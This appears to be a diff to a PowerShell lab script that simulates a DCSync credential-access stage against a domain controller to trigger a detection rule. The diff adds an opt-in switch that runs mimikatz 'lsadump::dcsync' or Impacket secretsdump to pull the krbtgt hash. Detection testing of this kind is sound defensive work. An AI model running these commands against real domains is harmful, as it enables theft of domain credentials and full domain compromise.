@@ -14,10 +14,12 @@
     the DRSUAPI/replication RPC path to the DC, generating the traffic; drop the
     helper in scripts\tools\ for the real hash pull.
 #>
-param([switch]$DryRun)
+param([switch]$DryRun,[switch]$EnableRealExploits)
 . "$PSScriptRoot\..\config\lab-config.ps1"
+. "$PSScriptRoot\_exploit.ps1"
 $cfg = $Global:EalDemo
 if ($DryRun) { $cfg.DryRun = $true }
+if ($EnableRealExploits) { $cfg.EnableRealExploits = $true }
 
 $dc = $cfg.DomainController
 Write-Stage "STAGE 5 (Credential Access): DCSync/replication RPC to DC $dc (from non-DC)" "INFO"
@@ -36,4 +38,21 @@ if ($cfg.DryRun) {
 $helper = Join-Path $PSScriptRoot "tools\mimikatz.exe"
 if (Test-Path $helper) { Write-Stage "  mimikatz found - exact DCSync: lsadump::dcsync /domain:$($cfg.Domain) /user:krbtgt" "INFO" }
 else { Write-Stage "  (For the exact DCSync, use mimikatz lsadump::dcsync or Impacket secretsdump -just-dc)" "INFO" }
+
+# Opt-in: fire the exact DCSync via an operator-supplied tool. mimikatz runs the
+# DRSUAPI GetNCChanges directly; Impacket secretsdump needs credentials the
+# operator supplies (it will prompt) - see README/checklist, no secrets hardcoded.
+Invoke-RealExploit -Name 'DCSync (DRSUAPI GetNCChanges)' `
+    -ToolCandidates @('mimikatz.exe','secretsdump.exe') `
+    -TrafficNote 'Replication/directory RPC to the DC was exercised.' `
+    -Run {
+        param($t)
+        if ($t -match 'mimikatz') {
+            & $t "lsadump::dcsync /domain:$($cfg.Domain) /dc:$($cfg.DomainController) /user:krbtgt" "exit"
+        } else {
+            # NOTE: secretsdump needs creds the operator supplies; pass domain/DC and let the tool prompt.
+            & $t -just-dc-user krbtgt "$($cfg.Domain)/@$($cfg.DomainController)"
+        }
+    }
+
 Write-Stage "STAGE 5 done. Expect EAL: 'Possible DCSync from a non domain controller' (rule b00baad9)." "OK"
